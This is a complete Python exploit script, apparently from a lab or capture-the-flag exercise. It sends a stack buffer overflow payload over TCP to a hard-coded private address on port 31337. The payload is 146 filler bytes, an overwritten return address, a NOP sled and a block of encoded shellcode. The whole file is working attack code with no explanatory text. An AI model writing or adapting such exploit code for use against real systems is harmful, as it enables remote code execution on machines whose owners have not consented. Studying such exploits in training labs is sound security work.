import socket, sys


ip = '10.0.2.57'	# Change this
port = 31337		# Change this

buffer = b'A' * 146
retn = b'\xbf\x16\x04\x08'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xdb\xc5\xd9\x74\x24\xf4\x5e\xbf\x08\xf6\xf1"
shellcode += b"\x04\x29\xc9\xb1\x31\x31\x7e\x18\x83\xc6\x04"
shellcode += b"\x03\x7e\x1c\x14\x04\xf8\xf4\x5a\xe7\x01\x04"
shellcode += b"\x3b\x61\xe4\x35\x7b\x15\x6c\x65\x4b\x5d\x20"
shellcode += b"\x89\x20\x33\xd1\x1a\x44\x9c\xd6\xab\xe3\xfa"
shellcode += b"\xd9\x2c\x5f\x3e\x7b\xae\xa2\x13\x5b\x8f\x6c"
shellcode += b"\x66\x9a\xc8\x91\x8b\xce\x81\xde\x3e\xff\xa6"
shellcode += b"\xab\x82\x74\xf4\x3a\x83\x69\x4c\x3c\xa2\x3f"
shellcode += b"\xc7\x67\x64\xc1\x04\x1c\x2d\xd9\x49\x19\xe7"
shellcode += b"\x52\xb9\xd5\xf6\xb2\xf0\x16\x54\xfb\x3d\xe5"
shellcode += b"\xa4\x3b\xf9\x16\xd3\x35\xfa\xab\xe4\x81\x81"
shellcode += b"\x77\x60\x12\x21\xf3\xd2\xfe\xd0\xd0\x85\x75"
shellcode += b"\xde\x9d\xc2\xd2\xc2\x20\x06\x69\xfe\xa9\xa9"
shellcode += b"\xbe\x77\xe9\x8d\x1a\xdc\xa9\xac\x3b\xb8\x1c"
shellcode += b"\xd0\x5c\x63\xc0\x74\x16\x89\x15\x05\x75\xc7"
shellcode += b"\xe8\x9b\x03\xa5\xeb\xa3\x0b\x99\x83\x92\x80"
shellcode += b"\x76\xd3\x2a\x43\x33\x3b\xc9\x46\x49\xd4\x54"
shellcode += b"\x03\xf0\xb9\x66\xf9\x36\xc4\xe4\x08\xc6\x33"
shellcode += b"\xf4\x78\xc3\x78\xb2\x91\xb9\x11\x57\x96\x6e"
shellcode += b"\x11\x72\xf5\xf1\x81\x1e\xd4\x94\x21\x84\x28"


payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        print('Sending payload')
        s.send(payload + b'\n')
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
